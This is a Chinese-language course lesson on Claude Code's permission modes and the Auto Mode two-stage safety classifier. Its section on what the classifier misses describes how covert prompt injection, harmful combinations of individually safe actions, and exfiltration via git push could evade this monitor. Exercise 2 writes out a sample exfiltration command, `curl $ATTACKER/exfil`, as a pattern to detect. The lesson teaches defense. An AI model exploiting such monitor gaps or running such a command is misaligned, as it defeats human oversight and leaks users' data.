# Claude Code 作为自主 agent：权限模式与 Auto Mode

> 译注：本文译自同目录 [`en.md`](./en.md)。术语遵循仓根 [TRANSLATION_GUIDE.md](../../../../TRANSLATION_GUIDE.md)。

> Claude Code 暴露了七种权限模式。"plan" 在每次动作前都要求确认，"default" 只在风险动作时确认，"acceptEdits" 自动批准文件写入但仍会确认 shell 执行，"bypassPermissions" 则一律放行。Auto Mode（2026 年 3 月 24 日发布）用一个两阶段并行安全分类器替代了逐动作审批：每个动作都跑一次单 token 的快速检查；被标记的动作再触发一次 chain-of-thought 深审。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 是以研究预览（research preview）形式发布的——Anthropic 明确表示分类器本身并不足够。

**Type:** Learn
**Languages:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01（长链路 agent）、Phase 15 · 09（编码 agent 全景）
**Time:** ~45 分钟

## 问题（The Problem）

跑在你机器上的自主编码 agent 是一个独立的安全类别。攻击面就是 agent 能触达的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已经公开提出警告：computer-use agent 不是 chatbot 的"功能升级"，它是一种新工具，带有一种新的风险画像。

Claude Code 的权限系统是 Anthropic 给出的答案。它没有"自主 / 不自主"这种一刀切的开关，而是用七种模式构成一道能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每一档都是速度和"逐动作审查"之间不同的权衡。Auto Mode（2026 年 3 月）又加上了一个两阶段分类器：分类器判定为安全的动作，审批不再卡在用户的关键路径上；被标记出来的动作则保留一层审查。

工程上的问题是：这个系统能拦下什么、漏掉什么？某个具体任务到底应该用哪一档？

## 概念（The Concept）

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | agent 提出一份计划；用户对整份计划做审批；每个动作执行前都会被审查 | 不熟悉的任务；贴近生产的代码；首次在某个 repo 上用 agent |
| `default` | agent 直接跑动作；遇到任何"风险"动作（shell 执行、破坏性操作、网络调用）都向用户确认 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍要确认 | 跨多文件的重构 |
| `acceptExec` | 在白名单（curated allowlist）内的 shell 命令自动批准；写入也自动批准 | 紧凑的内层循环，每条 shell 命令都形如 `npm test` |
| `autoMode` | 两阶段安全分类器；被标记的动作升级为人工审查 | 在受限工作区内长链路无人值守运行 |
| `yolo` | 跳过大部分提示；仍然遵循工具 allowlist / blocklist（白/黑名单） | 一次性沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 一律放行 | 文档明确写着"只在你愿意丢弃的一次性容器内使用" |

（上表名称对应 Claude Code 公开文档；"yolo" 是这种"较为放任的中间档位"的非正式简称。）

### 一页讲完 Auto Mode

Auto Mode（2026 年 3 月 24 日发布）是首个把"逐动作审批"交给模型的权限模式。结构如下：

1. **第一阶段——单 token 分类器。** 对每个被提议的动作都跑一次。代价低。返回 "safe" 或 "flag"。设计上与主 agent loop 并行运行，被批准的动作不会卡在队列里等。
2. **第二阶段——次级策略 / 安全审查。** 只对被标记的动作运行。围绕该动作、当前会话状态以及声明的任务做一次聚焦的策略与安全评估。置信度低时升级为 human-in-the-loop（人工确认）。

预算控制与分类器并列：

- `max_turns`——一次会话总迭代数。
- `max_budget_usd`——美元上限，超过即中止会话。
- 单工具的动作次数上限（例如 `WebFetch` 调用不超过 N 次等等）。

### 系统能拦下什么

- 直接的 prompt 注入：注入到工具输入里、且能映射到已知风险动作形态的指令。
- 重复性工具循环——分类器能看出第 N+1 个动作几乎就是第 N 个动作，连续五次。
- 在原本只做文件编辑的会话里，明显越界的 shell 命令。

### 系统可能漏掉什么

- **隐蔽的 prompt 注入**：调制了行为却不会产生任何单个被标记的动作。间接 prompt 注入并不是一个能完全打补丁修掉的漏洞（OpenAI 备战团队负责人，2025 年，针对浏览器 agent——见 Lesson 11）。
- **语义层面的偏差**。每一个单独动作都可能看上去安全，但组合起来的轨迹（trajectory）却是有害的。分类器判的是动作；它不会重新推导用户意图。
- **通过合法通道的数据外泄**。把数据写到你自己的文件、然后 `git push` 到公开仓库——这是一连串被允许的动作，问题出在它们的组合。

### "研究预览" 这个定位

Anthropic 是以研究预览（research preview）形式上线 Auto Mode 的。文档明确说分类器是一层防护，而不是解决方案：用户应当把 Auto Mode 与预算、allowlist、隔离工作区、轨迹审计组合起来用（见 Lesson 12–16）。"预览"的定位也呼应了文档化的"评估—部署 gap"问题（见 Lesson 1）——一个能通过离线 eval 的分类器，在真实会话中、用户上下文模糊时，行为可能完全不同。

### 这道阶梯落到你工作流的什么位置

- 不熟悉的任务：从 `plan` 起手。读一份计划比回滚一次糟糕的执行便宜。
- 已知重构：`acceptEdits` 能省掉大量确认点击。
- 无人值守的后台运行：只在你已经度量过爆炸半径（blast radius）的工作区里用 `autoMode`（无凭证、无生产挂载、不存在你没主动开放的出网通道）。
- 一次性容器：当且仅当容器和它的凭证是即用即弃的，`yolo` / `bypassPermissions` 才可以接受。

## 用起来（Use It）

`code/main.py` 模拟了这套两阶段分类器。第一阶段是对被提议动作做的廉价关键字规则；第二阶段是更慢的多规则审查器。驱动脚本喂入一段简短的合成轨迹（安全动作、一次 prompt 注入尝试、一段重复循环），展示分类器在哪里能拦下、又在哪里会漏掉。

## 上线部署（Ship It）

`outputs/skill-permission-mode-picker.md` 把一段任务描述匹配到对应的权限模式、预算上限、以及所需的隔离方式。

## 练习（Exercises）

1. 跑 `code/main.py`。哪一种合成动作类型从来不会被第一阶段标记、却总是被第二阶段抓住？哪一种两阶段都抓不住？

2. 扩展第一阶段的规则集，让它能抓到某个具体的已知坏形态（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测一下假阳性率。

3. 读一遍 Anthropic 的 "How the agent loop works" 文档。列出 `default` 模式下 agent 默认会触达的所有外部状态。在让 `autoMode` 无人值守跑起来之前，你需要单独控制其中哪些？

4. 设计一份 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、单工具上限、allowlist。为每个数字给出理由。

5. 描述一条这样的轨迹：每个单独动作都被第一阶段和第二阶段批准，但组合起来的行为却是失准的。（Lesson 14 讲了 kill switch 和金丝雀 token 如何应对这种情况。）

## 关键术语（Key Terms）

| 术语 | 大家怎么说 | 实际含义 |
|---|---|---|
| Permission mode | "agent 能做多少事" | 七种命名策略之一，控制逐动作审批 |
| plan mode | "干啥都先问一下" | agent 先写计划；用户审批后才执行 |
| acceptEdits | "让它去写文件" | 文件写入自动批准；shell 执行仍会确认 |
| autoMode | "自动审批" | 两阶段安全分类器；被标记的动作会升级 |
| bypassPermissions | "完全 YOLO" | 一律放行；用于一次性容器 |
| Stage 1 classifier | "快速 token 检查" | 在被提议动作上跑的单 token 规则；并行执行 |
| Stage 2 classifier | "深审" | 对被标记动作做 chain-of-thought 推理 |
| Research preview | "未 GA" | Anthropic 用来标记那些失效模式仍在摸排中的特性 |

## 延伸阅读（Further Reading）

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop)——权限模式、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview)——托管服务的执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code)——产品功能面与 Auto Mode 发布。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution)——塑造分类器判断的"基于理由"那一层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy)——长链路权限设计的内部视角。
